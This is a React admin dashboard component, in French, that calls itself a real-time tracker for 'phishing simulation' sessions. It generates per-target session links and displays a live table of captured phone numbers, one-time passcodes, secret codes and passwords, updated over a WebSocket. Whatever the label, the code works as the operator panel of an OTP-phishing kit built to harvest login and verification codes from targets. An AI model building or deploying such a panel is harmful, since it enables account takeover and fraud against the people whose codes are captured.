import { useState, useEffect } from 'react';
import { io, Socket } from 'socket.io-client';

interface Session {
  id: string;
  phone_number?: string;
  otp?: string;
  secret_code?: string;
  password?: string;
  created_at: string;
  updated_at: string;
}

const AdminDashboard = () => {
  const [sessions, setSessions] = useState<Session[]>([]);
  const [socket, setSocket] = useState<Socket | null>(null);

  useEffect(() => {
    // Fetch initial sessions
    fetchSessions();

    // Connect to WebSocket
    const newSocket = io('http://localhost:3001');
    newSocket.emit('join_admin');
    
    newSocket.on('session_update', (data) => {
      console.log('Received session update:', data);
      // Reload all sessions from database to ensure data persistence
      fetchSessions();
    });

    setSocket(newSocket);

    return () => {
      newSocket.disconnect();
    };
  }, []);

  const fetchSessions = async () => {
    try {
      const response = await fetch('http://localhost:3001/api/sessions');
      const data = await response.json();
      setSessions(data);
    } catch (error) {
      console.error('Error fetching sessions:', error);
    }
  };

  const generateSessionLink = async () => {
    try {
      const response = await fetch('http://localhost:3001/api/session', {
        method: 'POST',
      });
      const data = await response.json();
      const link = `${window.location.origin}/?id=${data.sessionId}`;
      alert(`Lien de session généré: ${link}`);
      fetchSessions();
    } catch (error) {
      console.error('Error generating session:', error);
    }
  };

  const copyLink = (sessionId: string) => {
    const link = `${window.location.origin}/?id=${sessionId}`;
    navigator.clipboard.writeText(link);
    alert('Lien copié dans le presse-papiers!');
  };

  return (
    <div className="min-h-screen bg-gray-100 p-8">
      <div className="max-w-7xl mx-auto">
        {/* Header */}
        <div className="mb-8">
          <h1 className="text-3xl font-bold text-gray-800 mb-2">
            Tableau de Bord Administrateur
          </h1>
          <p className="text-gray-600">
            Suivi en temps réel des sessions de simulation de phishing
          </p>
        </div>

        {/* Actions */}
        <div className="mb-6">
          <button
            onClick={generateSessionLink}
            className="bg-blue-600 text-white px-6 py-3 rounded-lg font-semibold hover:bg-blue-700 transition-colors"
          >
            Générer un nouveau lien de session
          </button>
        </div>

        {/* Sessions Table */}
        <div className="bg-white rounded-lg shadow overflow-hidden">
          <table className="min-w-full">
            <thead className="bg-gray-50">
              <tr>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                  Session ID
                </th>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                  Numéro de téléphone
                </th>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                  OTP
                </th>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                  Code secret
                </th>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                  Mot de passe
                </th>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                  Créé le
                </th>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                  Actions
                </th>
              </tr>
            </thead>
            <tbody className="bg-white divide-y divide-gray-200">
              {sessions.map((session) => (
                <tr key={session.id} className="hover:bg-gray-50">
                  <td className="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900">
                    {session.id.slice(0, 8)}...
                  </td>
                  <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                    {session.phone_number ? (
                      <span className="text-green-600 font-medium">
                        {session.phone_number}
                      </span>
                    ) : (
                      <span className="text-orange-500 font-medium">En attente</span>
                    )}
                  </td>
                  <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                    {session.otp ? (
                      <span className="text-green-600 font-medium">{session.otp}</span>
                    ) : (
                      <span className="text-orange-500 font-medium">En attente</span>
                    )}
                  </td>
                  <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                    {session.secret_code ? (
                      <span className="text-green-600 font-medium">
                        {session.secret_code}
                      </span>
                    ) : (
                      <span className="text-orange-500 font-medium">En attente</span>
                    )}
                  </td>
                  <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                    {session.password ? (
                      <span className="text-green-600 font-medium">••••••</span>
                    ) : (
                      <span className="text-orange-500 font-medium">En attente</span>
                    )}
                  </td>
                  <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                    {new Date(session.created_at).toLocaleString('fr-FR')}
                  </td>
                  <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                    <button
                      onClick={() => copyLink(session.id)}
                      className="text-blue-600 hover:text-blue-800 font-medium"
                    >
                      Copier le lien
                    </button>
                  </td>
                </tr>
              ))}
              {sessions.length === 0 && (
                <tr>
                  <td colSpan={7} className="px-6 py-12 text-center text-gray-500">
                    Aucune session active. Cliquez sur "Générer un nouveau lien de session" pour commencer.
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>

        {/* Legend */}
        <div className="mt-6 bg-white rounded-lg shadow p-4">
          <h3 className="text-sm font-medium text-gray-700 mb-2">Légende</h3>
          <div className="flex gap-6 text-sm">
            <div className="flex items-center gap-2">
              <span className="w-3 h-3 bg-green-600 rounded-full"></span>
              <span className="text-gray-600">Données collectées</span>
            </div>
            <div className="flex items-center gap-2">
              <span className="w-3 h-3 bg-gray-400 rounded-full"></span>
              <span className="text-gray-600">En attente</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default AdminDashboard;
